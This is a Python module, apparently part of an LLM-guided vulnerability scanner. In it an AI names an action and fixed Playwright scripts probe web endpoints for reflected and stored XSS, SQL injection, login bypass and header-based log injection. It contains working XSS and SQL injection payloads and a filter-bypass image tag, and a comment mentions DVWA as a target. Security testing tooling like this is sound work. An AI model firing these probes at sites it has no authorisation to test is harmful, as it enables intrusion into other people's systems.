"""
Phase 3 — Constrained Playwright verification layer.

The LLM names an action; Playwright runs a predetermined script.
No freestyle LLM-to-browser instructions.

Exports:
    VerificationAction  — dataclass describing what to run
    VerificationResult  — TypedDict for the outcome
    VERIFICATION_REGISTRY — maps action name -> coroutine function
"""
from dataclasses import dataclass
from typing import Callable, TypedDict

from playwright.async_api import Page


class VerificationResult(TypedDict):
    exploit_attempted: bool
    success_signal: str
    confidence: str  # "high" | "medium" | "low" | "none"


@dataclass
class VerificationAction:
    action: str
    endpoint: str
    payload: str
    notes: str = ""


# ---------------------------------------------------------------------------
# Verification functions — one per supported action
# ---------------------------------------------------------------------------

async def verify_reflected_xss(
    page: Page, endpoint: str, payload: str
) -> VerificationResult:
    """Navigate to endpoint with payload in query string; check DOM for reflection.

    Tries two payloads to handle targets that filter <script> tags:
      1. <script>alert(1)</script>  — standard reflected XSS
      2. <img src="xss_canary">     — bypasses script-tag filters; detect via unique marker
    """
    # (payload, marker_to_search_for) — marker handles browser quote normalisation
    _PAYLOADS = [
        ("<script>alert(1)</script>", "<script>alert(1)</script>"),
        ('<img src="xss_canary">', "xss_canary"),
    ]
    try:
        await page.goto(endpoint, timeout=10000)
        # Detect the text input field name dynamically so we use the correct param.
        inputs = page.locator("form input[type='text'], form input:not([type])")
        if await inputs.count() > 0:
            first_inp = (await inputs.all())[0]
            field_name = await first_inp.get_attribute("name") or "q"
            for test_payload, marker in _PAYLOADS:
                await page.goto(f"{endpoint}?{field_name}={test_payload}", timeout=10000)
                content = await page.content()
                if marker in content:
                    return {
                        "exploit_attempted": True,
                        "success_signal": f"payload reflected in DOM via ?{field_name}= query param",
                        "confidence": "high",
                    }
            # Fall back to form fill + button click (includes Submit in GET params)
            await page.goto(endpoint, timeout=10000)
            for inp in await inputs.all():
                await inp.fill(_PAYLOADS[0][0])
            submit_btn = page.locator("form input[type='submit'], form button[type='submit']")
            if await submit_btn.count() > 0:
                await submit_btn.first.click()
            else:
                await page.locator("form").evaluate("f => f.submit()")
            await page.wait_for_load_state("networkidle", timeout=5000)
            if _PAYLOADS[0][1] in await page.content():
                return {
                    "exploit_attempted": True,
                    "success_signal": "payload reflected via form submission",
                    "confidence": "high",
                }
        return {
            "exploit_attempted": True,
            "success_signal": "payload not reflected",
            "confidence": "none",
        }
    except Exception as exc:
        return {
            "exploit_attempted": True,
            "success_signal": f"error: {exc}",
            "confidence": "none",
        }


async def verify_stored_xss(
    page: Page, endpoint: str, payload: str
) -> VerificationResult:
    """Submit payload via POST form then revisit the page to confirm storage/reflection.

    Used for stored XSS endpoints where the payload is persisted in a database
    and rendered on subsequent page loads, not reflected immediately in the response.
    """
    if not payload:
        payload = "<script>alert(1)</script>"
    _MARKER = "xss_stored_canary_9z3k"
    try:
        await page.goto(endpoint, timeout=10000)
        # Fill all visible text inputs and textareas with the canary marker
        for locator_str in [
            "form input[type='text']",
            "form input:not([type])",
            "form textarea",
        ]:
            loc = page.locator(locator_str)
            for inp in await loc.all():
                await inp.fill(_MARKER)
        submit_btn = page.locator("form input[type='submit'], form button[type='submit']")
        if await submit_btn.count() > 0:
            await submit_btn.first.click()
        else:
            await page.locator("form").evaluate("f => f.submit()")
        await page.wait_for_load_state("networkidle", timeout=5000)
        # Revisit the page to see if the canary was stored and reflected
        await page.goto(endpoint, timeout=10000)
        content = await page.content()
        if _MARKER in content:
            return {
                "exploit_attempted": True,
                "success_signal": "stored XSS canary found in page after submission",
                "confidence": "high",
            }
        return {
            "exploit_attempted": True,
            "success_signal": "stored payload not found on revisit",
            "confidence": "none",
        }
    except Exception as exc:
        return {
            "exploit_attempted": True,
            "success_signal": f"error: {exc}",
            "confidence": "none",
        }


async def verify_log_injection(
    page: Page, endpoint: str, payload: str
) -> VerificationResult:
    """Inject payload via User-Agent and X-Forwarded-For; watch for server errors."""
    try:
        await page.set_extra_http_headers(
            {"User-Agent": payload, "X-Forwarded-For": payload}
        )
        response = await page.goto(endpoint, timeout=10000)
        status = response.status if response else 0
        if status >= 500:
            return {
                "exploit_attempted": True,
                "success_signal": f"server error {status} triggered by payload",
                "confidence": "medium",
            }
        return {
            "exploit_attempted": True,
            "success_signal": f"no server error (status {status})",
            "confidence": "none",
        }
    except Exception as exc:
        return {
            "exploit_attempted": True,
            "success_signal": f"error: {exc}",
            "confidence": "none",
        }


async def verify_auth_bypass(
    page: Page, endpoint: str, payload: str
) -> VerificationResult:
    """Submit payload as username in a login form; look for post-login indicators."""
    try:
        await page.goto(endpoint, timeout=10000)
        username_inp = await page.query_selector(
            "input[name='username'], input[name='user'], input[type='email']"
        )
        password_inp = await page.query_selector(
            "input[name='password'], input[name='pass'], input[type='password']"
        )
        if username_inp and password_inp:
            await username_inp.fill(payload)
            await password_inp.fill("anything")
            form = await page.query_selector("form")
            if form:
                await form.evaluate("f => f.submit()")
                await page.wait_for_load_state("networkidle", timeout=5000)
                content = await page.content()
                if any(
                    kw in content.lower()
                    for kw in ("logout", "welcome", "dashboard", "profile")
                ):
                    return {
                        "exploit_attempted": True,
                        "success_signal": "auth bypass indicators found in response",
                        "confidence": "high",
                    }
        return {
            "exploit_attempted": True,
            "success_signal": "no auth bypass indicators",
            "confidence": "none",
        }
    except Exception as exc:
        return {
            "exploit_attempted": True,
            "success_signal": f"error: {exc}",
            "confidence": "none",
        }


async def verify_sql_injection(
    page: Page, endpoint: str, payload: str
) -> VerificationResult:
    """Submit SQLi payload via query param and form; look for DB error messages."""
    if not payload:
        payload = "'"
    _SQL_ERRORS = (
        "sql syntax", "mysql_fetch", "ora-", "sqlite", "pg_query",
        "unclosed quotation", "syntax error", "warning: mysql",
    )
    try:
        # Include Submit=Submit — DVWA gates query execution on isset($_GET['Submit'])
        await page.goto(f"{endpoint}?id={payload}&Submit=Submit", timeout=10000)
        content = await page.content()
        if any(e in content.lower() for e in _SQL_ERRORS):
            return {
                "exploit_attempted": True,
                "success_signal": "SQL error message in response (query param)",
                "confidence": "high",
            }
        # Fall back to form fill + button click so Submit is included in the request
        inputs = page.locator("form input[type='text'], form input:not([type])")
        if await inputs.count() > 0:
            for inp in await inputs.all():
                await inp.fill(payload)
            submit_btn = page.locator("form input[type='submit'], form button[type='submit']")
            if await submit_btn.count() > 0:
                await submit_btn.first.click()
            else:
                await page.locator("form").evaluate("f => f.submit()")
            await page.wait_for_load_state("networkidle", timeout=5000)
            post_content = await page.content()
            if any(e in post_content.lower() for e in _SQL_ERRORS):
                return {
                    "exploit_attempted": True,
                    "success_signal": "SQL error message via form submission",
                    "confidence": "high",
                }
        return {
            "exploit_attempted": True,
            "success_signal": "no SQL error indicators",
            "confidence": "none",
        }
    except Exception as exc:
        return {
            "exploit_attempted": True,
            "success_signal": f"error: {exc}",
            "confidence": "none",
        }


# ---------------------------------------------------------------------------
# Registry — LLM output an action name string; we do a dict lookup (no eval)
# ---------------------------------------------------------------------------

VERIFICATION_REGISTRY: dict[str, Callable] = {
    "verify_reflected_xss": verify_reflected_xss,
    "verify_stored_xss": verify_stored_xss,
    "verify_log_injection": verify_log_injection,
    "verify_auth_bypass": verify_auth_bypass,
    "verify_sql_injection": verify_sql_injection,
}
